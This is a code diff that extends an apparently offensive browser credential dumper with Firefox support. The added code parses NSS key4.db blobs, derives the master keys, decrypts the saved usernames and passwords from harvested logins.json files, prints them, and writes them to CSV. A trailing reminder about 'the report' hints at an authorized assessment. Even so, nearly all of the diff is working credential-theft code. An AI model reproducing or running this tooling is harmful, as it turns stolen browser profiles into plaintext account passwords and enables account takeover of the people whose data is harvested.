@@ -37,6 +37,8 @@ import base64
 import csv
 import ctypes
 import ctypes.wintypes as wt
+import glob
+import hashlib
 import json
 import os
 import shutil
@@ -187,6 +189,226 @@ def load_key(state_path: str) -> bytes:
     return dpapi_unwrap(wrapped[5:])
 
 
+# ------------------------------------------------------- CBC (Firefox/NSS) --
+BCRYPT_BLOCK_PADDING = 1
+
+
+def cbc_encrypt(alg_name: str, key: bytes, iv: bytes, data: bytes) -> bytes:
+    bcrypt = ctypes.windll.bcrypt
+    key_buf = ctypes.create_string_buffer(bytes(key), len(key))
+    iv_buf = ctypes.create_string_buffer(bytes(iv), len(iv))
+    pt = ctypes.create_string_buffer(bytes(data), max(1, len(data)))
+    out = ctypes.create_string_buffer(len(data) + 32)
+    got = wt.ULONG()
+    hAlg = wt.HANDLE()
+    if bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(hAlg), alg_name, None, 0):
+        raise OSError("BCryptOpenAlgorithmProvider(%s) failed" % alg_name)
+    try:
+        obj_len = wt.ULONG()
+        cb = wt.ULONG()
+        if bcrypt.BCryptGetProperty(hAlg, "ObjectLength", ctypes.byref(obj_len),
+                                    4, ctypes.byref(cb), 0):
+            raise OSError("BCryptGetProperty failed")
+        key_obj = ctypes.create_string_buffer(obj_len.value)
+        hKey = wt.HANDLE()
+        if bcrypt.BCryptGenerateSymmetricKey(hAlg, ctypes.byref(hKey), key_obj,
+                                             obj_len.value, key_buf,
+                                             len(key), 0):
+            raise OSError("BCryptGenerateSymmetricKey failed")
+        try:
+            st = bcrypt.BCryptEncrypt(hKey, pt, len(data), None, iv_buf,
+                                      len(iv), out, len(out),
+                                      ctypes.byref(got),
+                                      BCRYPT_BLOCK_PADDING) & 0xFFFFFFFF
+            if st:
+                raise OSError("BCryptEncrypt: 0x%08X" % st)
+            return out.raw[:got.value]
+        finally:
+            bcrypt.BCryptDestroyKey(hKey)
+    finally:
+        bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)
+
+
+def cbc_decrypt(alg_name: str, key: bytes, iv: bytes, data: bytes) -> bytes:
+    bcrypt = ctypes.windll.bcrypt
+    key_buf = ctypes.create_string_buffer(bytes(key), len(key))
+    iv_buf = ctypes.create_string_buffer(bytes(iv), len(iv))
+    ct = ctypes.create_string_buffer(bytes(data), max(1, len(data)))
+    out = ctypes.create_string_buffer(len(data) + 32)
+    got = wt.ULONG()
+    hAlg = wt.HANDLE()
+    if bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(hAlg), alg_name, None, 0):
+        raise OSError("BCryptOpenAlgorithmProvider(%s) failed" % alg_name)
+    try:
+        obj_len = wt.ULONG()
+        cb = wt.ULONG()
+        if bcrypt.BCryptGetProperty(hAlg, "ObjectLength", ctypes.byref(obj_len),
+                                    4, ctypes.byref(cb), 0):
+            raise OSError("BCryptGetProperty failed")
+        key_obj = ctypes.create_string_buffer(obj_len.value)
+        hKey = wt.HANDLE()
+        if bcrypt.BCryptGenerateSymmetricKey(hAlg, ctypes.byref(hKey), key_obj,
+                                             obj_len.value, key_buf,
+                                             len(key), 0):
+            raise OSError("BCryptGenerateSymmetricKey failed")
+        try:
+            st = bcrypt.BCryptDecrypt(hKey, ct, len(data), None, iv_buf,
+                                      len(iv), out, len(out),
+                                      ctypes.byref(got),
+                                      BCRYPT_BLOCK_PADDING) & 0xFFFFFFFF
+            if st:
+                raise OSError("BCryptDecrypt: 0x%08X" % st)
+            return out.raw[:got.value]
+        finally:
+            bcrypt.BCryptDestroyKey(hKey)
+    finally:
+        bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)
+
+
+# ------------------------------------------------- minimal DER (NSS blobs) --
+def der_read(buf: bytes, i: int = 0):
+    """Return (tag, content, next_offset) for one DER element."""
+    tag = buf[i]
+    i += 1
+    ln = buf[i]
+    i += 1
+    if ln & 0x80:
+        n = ln & 0x7F
+        ln = int.from_bytes(buf[i:i + n], "big")
+        i += n
+    return tag, buf[i:i + ln], i + ln
+
+
+def der_children(content: bytes):
+    out = []
+    i = 0
+    while i < len(content):
+        try:
+            tag, val, i = der_read(content, i)
+        except IndexError:
+            break  # tolerate trailing padding/garbage
+        out.append((tag, val))
+    return out
+
+
+# ---------------------------------------------------------- Firefox (NSS) ---
+def firefox_item_decrypt(blob: bytes, global_salt: bytes):
+    """Decrypt a key4.db PBE blob. Returns (clear, key_len).
+
+    Modern Firefox (v52+): PBKDF2-HMAC-SHA256 -> AES-256-CBC.
+    Legacy: SHA1-based key derivation -> 3DES-CBC.
+    """
+    _, body, _ = der_read(blob)
+    ch = der_children(body)
+    params, cipher = ch[0][1], ch[1][1]
+    pc = der_children(params)
+    try:
+        entry_salt = pc[0][1]
+        iters = int.from_bytes(pc[1][1], "big")
+        key_len = int.from_bytes(pc[2][1], "big")
+        k = hashlib.sha1(global_salt + entry_salt).digest()
+        key = hashlib.pbkdf2_hmac("sha256", k, entry_salt, iters, key_len)
+        iv = b"\x04\x0e" + pc[4][1][:14]
+        clear = cbc_decrypt("AES", key, iv, cipher)
+        return clear, key_len
+    except (IndexError, OSError):
+        pass
+    entry_salt = pc[0][1]
+    hp = hashlib.sha1(global_salt + entry_salt).digest()
+    pes = entry_salt + b"\x00" * max(0, 20 - len(entry_salt))
+    chp = hashlib.sha1(hp + pes).digest()
+    k1 = hashlib.sha1(hp + pes).digest()
+    k2 = hashlib.sha1(chp + pes).digest()
+    ka = k1 + k2
+    clear = cbc_decrypt("3DES", ka[:24], ka[-8:], cipher)
+    return clear, 24
+
+
+def firefox_master_keys(key4_path: str) -> dict:
+    """key4.db -> {key_id: item-key}. Fails clearly if a master password is set."""
+    db = sqlite3.connect(key4_path)
+    row = db.execute("SELECT item1, item2 FROM metaData "
+                     "WHERE id = 'password-check'").fetchone()
+    if row is None:
+        raise ValueError("metaData password-check missing")
+    item1, global_salt = bytes(row[0]), bytes(row[1])
+    clear, _ = firefox_item_decrypt(item1, global_salt)
+    if not clear.startswith(b"password-check"):
+        raise ValueError("password-check mismatch (master password set?)")
+    keys = {}
+    try:
+        rows = db.execute("SELECT a11 FROM nssPrivate").fetchall()
+    except sqlite3.Error:
+        rows = []
+    for (a11,) in rows:
+        if not a11:
+            continue
+        try:
+            a11 = bytes(a11)
+            clear, klen = firefox_item_decrypt(a11, global_salt)
+            _, body, _ = der_read(a11)
+            key_id = der_children(body)[0][1]
+            keys[key_id] = clear[13:13 + klen]
+        except Exception:
+            continue
+    if not keys:
+        raise ValueError("no item keys recovered from nssPrivate")
+    return keys
+
+
+def ff_decrypt_item(b64: str, keys: dict) -> str:
+    blob = base64.b64decode(b64)
+    _, body, _ = der_read(blob)
+    ch = der_children(body)
+    key = keys.get(ch[0][1])
+    if key is None:
+        raise ValueError("no key for key-id")
+    seq = der_children(ch[1][1])
+    iv, ct = seq[1][1], seq[2][1]
+    alg = "3DES" if len(key) == 24 else "AES"
+    clear = cbc_decrypt(alg, key, iv, ct)
+    return clear.decode("utf-16-be")
+
+
+def dump_firefox_all():
+    """Harvested FF_<profile>_key4.db + FF_<profile>_logins.json -> plaintext."""
+    for key4 in sorted(glob.glob(os.path.join(ART_DIR, "FF_*_key4.db"))):
+        prof = os.path.basename(key4)[3:-8]
+        logins = os.path.join(ART_DIR, "FF_%s_logins.json" % prof)
+        if not os.path.isfile(logins):
+            print("[-] Firefox %s: logins.json not harvested yet "
+                  "(no saved passwords at harvest time)" % prof)
+            continue
+        try:
+            keys = firefox_master_keys(key4)
+        except Exception as e:
+            print("[-] Firefox %s: key4.db failed: %s" % (prof, e))
+            continue
+        with open(logins, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        results = []
+        for item in data.get("logins", []):
+            try:
+                user = ff_decrypt_item(item["encryptedUsername"], keys)
+                pwd = ff_decrypt_item(item["encryptedPassword"], keys)
+                url = item.get("formSubmitURL") or item.get("hostname") or ""
+                results.append(("Firefox/" + prof, url, user, pwd))
+            except Exception:
+                continue
+        total = len(data.get("logins", []))
+        print("[*] Firefox/%s: logins=%d decrypted=%d"
+              % (prof, total, len(results)))
+        for _, url, user, pwd in results:
+            print("    %-28s %s" % (user[:28], pwd[:32]))
+        if results:
+            out_csv = os.path.join(ART_DIR, "firefox_%s_passwords.csv" % prof)
+            with open(out_csv, "w", newline="", encoding="utf-8-sig") as f:
+                w = csv.writer(f)
+                w.writerow(["browser", "url", "username", "password"])
+                w.writerows(results)
+            print("    saved -> %s" % out_csv)
+
+
 def dump_browser(name, state_fn, login_fn):
     state = os.path.join(ART_DIR, state_fn)
     login = os.path.join(ART_DIR, login_fn)
@@ -261,6 +483,23 @@ def selftest():
         raise AssertionError("wrong key should have failed")
     except ValueError:
         print("[+] Wrong-key rejection (GCM tag) OK")
+
+    key = os.urandom(32)
+    iv = os.urandom(16)
+    pt = b"firefox-cbc-selftest"
+    assert cbc_decrypt("AES", key, iv, cbc_encrypt("AES", key, iv, pt)) == pt
+    print("[+] AES-256-CBC (Firefox modern) roundtrip OK")
+
+    key = os.urandom(24)
+    iv = os.urandom(8)
+    assert cbc_decrypt("3DES", key, iv, cbc_encrypt("3DES", key, iv, pt)) == pt
+    print("[+] 3DES-CBC (Firefox legacy) roundtrip OK")
+
+    der = bytes([0x30, 0x07, 0x04, 0x02, 0xAA, 0xBB, 0x02, 0x01, 0x07])
+    ch = der_children(der[2:])
+    assert ch[0] == (0x04, b"\xaa\xbb") and ch[1] == (0x02, b"\x07")
+    print("[+] DER mini-parser OK")
+
     print("[+] ALL SELFTESTS PASSED")
 
 
@@ -274,6 +513,7 @@ def main():
         return
     for name, state_fn, login_fn in BROWSERS:
         dump_browser(name, state_fn, login_fn)
+    dump_firefox_all()
     print("[n] Reminder: v20 = app-bound encryption (Chrome 127+) — the "
           "defense working as intended. Discuss in the report.")
 
